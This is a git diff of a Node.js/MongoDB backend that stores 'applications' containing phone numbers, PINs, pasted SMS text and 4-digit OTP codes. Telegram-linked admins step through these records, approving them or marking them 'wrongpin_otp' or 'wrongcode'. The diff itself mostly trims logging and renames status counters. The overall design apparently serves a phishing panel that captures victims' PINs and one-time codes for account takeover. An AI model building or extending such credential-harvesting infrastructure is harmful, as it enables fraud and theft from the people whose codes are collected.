@@ -137,16 +137,7 @@ async function saveAdmin(adminData) {
 
         if (adminData.botToken) adminDocument.botToken = adminData.botToken;
 
-        console.log(`💾 Saving admin to database:`, {
-            adminId: adminDocument.adminId,
-            name:    adminDocument.name,
-            email:   adminDocument.email,
-            chatId:  adminDocument.chatId,
-            status:  adminDocument.status
-        });
-
         const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
-        
         await logAdminActivity(adminId, 'ADMIN_CREATED', { name: adminData.name, email: adminData.email });
 
         console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
@@ -206,8 +197,6 @@ async function updateAdmin(adminId, updates) {
         );
         
         await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);
-
-        console.log(`🔄 Admin ${adminId} updated`);
         return result;
     } catch (error) {
         console.error('❌ Error updating admin:', error);
@@ -223,8 +212,6 @@ async function updateAdminStatus(adminId, status) {
         );
         
         await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });
-
-        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
         return result;
     } catch (error) {
         console.error('❌ Error updating admin status:', error);
@@ -235,10 +222,7 @@ async function updateAdminStatus(adminId, status) {
 async function deleteAdmin(adminId) {
     try {
         const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
-        
         await logAdminActivity(adminId, 'ADMIN_DELETED', {});
-
-        console.log(`🗑️ Admin deleted: ${adminId}`);
         return result;
     } catch (error) {
         console.error('❌ Error deleting admin:', error);
@@ -266,7 +250,7 @@ async function getAdminCount() {
 }
 
 // ==========================================
-// APPLICATION OPERATIONS (Enhanced for 2-Step OTP)
+// APPLICATION OPERATIONS (Two-Step OTP Support)
 // ==========================================
 
 async function saveApplication(appData) {
@@ -278,11 +262,12 @@ async function saveApplication(appData) {
             phoneNumber:     appData.phoneNumber,
             pin:             appData.pin,
             pinStatus:       appData.pinStatus  || 'pending',
-            // Two-Step OTP Fields
+            // Step 1: SMS Content & Status Tracking
             smsText:         appData.smsText    || null,
-            smsStatus:       appData.smsStatus  || 'pending', // Step 1: SMS Pasting Status
-            otp:             appData.otp        || null,      // Step 2: 4-Digit OTP Code
-            otpStatus:       appData.otpStatus  || 'pending', // Step 2: 4-Digit Verification Status
+            smsStatus:       appData.smsStatus  || 'pending', // 'pending', 'approved', 'rejected'
+            // Step 2: 4-Digit OTP Code & Status Tracking
+            otp:             appData.otp        || null,
+            otpStatus:       appData.otpStatus  || 'pending', // 'pending', 'approved', 'rejected'
             assignmentType:  appData.assignmentType,
             isReturningUser: appData.isReturningUser || false,
             previousCount:   appData.previousCount   || 0,
@@ -331,9 +316,9 @@ async function updateApplication(applicationId, updates) {
 }
 
 /**
- * Specialized helper for updating Step 1 (SMS Pasting Content & Status)
+ * Update Step 1: Handle SMS Pasting submission sent to backend for admin check
  */
-async function updateApplicationSms(applicationId, smsText, smsStatus = 'submitted') {
+async function updateApplicationSms(applicationId, smsText, smsStatus = 'pending') {
     try {
         const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
             { id: applicationId },
@@ -348,10 +333,10 @@ async function updateApplicationSms(applicationId, smsText, smsStatus = 'submitt
 
         const app = await getApplication(applicationId);
         if (app && app.adminId) {
-            await logAdminActivity(app.adminId, 'APPLICATION_SMS_SUBMITTED', { applicationId, smsText });
+            await logAdminActivity(app.adminId, 'SMS_OTP_SUBMITTED', { applicationId, smsText, smsStatus });
         }
 
-        console.log(`🔄 Application SMS Step updated: ${applicationId}`);
+        console.log(`🔄 SMS Step updated for application: ${applicationId}`);
         return result;
     } catch (error) {
         console.error('❌ Error updating application SMS step:', error);
@@ -360,7 +345,7 @@ async function updateApplicationSms(applicationId, smsText, smsStatus = 'submitt
 }
 
 /**
- * Specialized helper for updating Step 2 (4-Digit OTP Code & Status)
+ * Update Step 2: Handle 4-Digit OTP verification code submission
  */
 async function updateApplicationOtp(applicationId, otp, otpStatus = 'pending') {
     try {
@@ -377,10 +362,10 @@ async function updateApplicationOtp(applicationId, otp, otpStatus = 'pending') {
 
         const app = await getApplication(applicationId);
         if (app && app.adminId) {
-            await logAdminActivity(app.adminId, 'APPLICATION_OTP_SUBMITTED', { applicationId, otpStatus });
+            await logAdminActivity(app.adminId, 'FOUR_DIGIT_OTP_SUBMITTED', { applicationId, otpStatus });
         }
 
-        console.log(`🔄 Application 4-Digit OTP Step updated: ${applicationId}`);
+        console.log(`🔄 4-Digit OTP Step updated for application: ${applicationId}`);
         return result;
     } catch (error) {
         console.error('❌ Error updating application OTP step:', error);
@@ -407,7 +392,7 @@ async function getPendingApplications(adminId) {
                 adminId,
                 $or: [
                     { pinStatus: 'pending' }, 
-                    { smsStatus: 'pending' },
+                    { smsStatus: 'pending' }, 
                     { otpStatus: 'pending' }
                 ]
             })
@@ -425,16 +410,18 @@ async function getPendingApplications(adminId) {
 
 async function getAdminStats(adminId) {
     try {
-        const total          = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
-        const pinPending     = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
-        const pinApproved    = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
-        const smsSubmitted   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsStatus: 'submitted' });
-        const otpPending     = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
-        const fullyApproved  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
-        return { total, pinPending, pinApproved, smsSubmitted, otpPending, fullyApproved };
+        const total         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
+        const pinPending    = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
+        const pinApproved   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
+        const smsPending    = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsStatus: 'pending' });
+        const smsApproved   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsStatus: 'approved' });
+        const otpPending    = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
+        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
+        
+        return { total, pinPending, pinApproved, smsPending, smsApproved, otpPending, fullyApproved };
     } catch (error) {
         console.error('❌ Error getting admin stats:', error);
-        return { total: 0, pinPending: 0, pinApproved: 0, smsSubmitted: 0, otpPending: 0, fullyApproved: 0 };
+        return { total: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0 };
     }
 }
 
@@ -444,21 +431,24 @@ async function getStats() {
         const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
         const pinPending        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
         const pinApproved       = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
-        const smsSubmitted      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsStatus: 'submitted' });
+        const smsPending        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsStatus: 'pending' });
+        const smsApproved       = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsStatus: 'approved' });
         const otpPending        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
         const fullyApproved     = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
         const totalRejected     = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
             $or: [
                 { pinStatus: 'rejected' },
                 { smsStatus: 'rejected' },
+                { otpStatus: 'rejected' },
                 { otpStatus: 'wrongpin_otp' },
                 { otpStatus: 'wrongcode' }
             ]
         });
-        return { totalAdmins, totalApplications, pinPending, pinApproved, smsSubmitted, otpPending, fullyApproved, totalRejected };
+
+        return { totalAdmins, totalApplications, pinPending, pinApproved, smsPending, smsApproved, otpPending, fullyApproved, totalRejected };
     } catch (error) {
         console.error('❌ Error getting stats:', error);
-        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, smsSubmitted: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
+        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
     }
 }
 
@@ -482,15 +472,10 @@ async function getPerAdminStats() {
 
 async function getAllAdminsDetailed() {
     try {
-        const admins = await db.collection(COLLECTIONS.ADMINS)
+        return await db.collection(COLLECTIONS.ADMINS)
             .find({})
             .sort({ createdAt: -1 })
             .toArray();
-        console.log(`📊 Found ${admins.length} admins in database`);
-        admins.forEach(admin => {
-            console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
-        });
-        return admins;
     } catch (error) {
         console.error('❌ Error getting detailed admins:', error);
         return [];
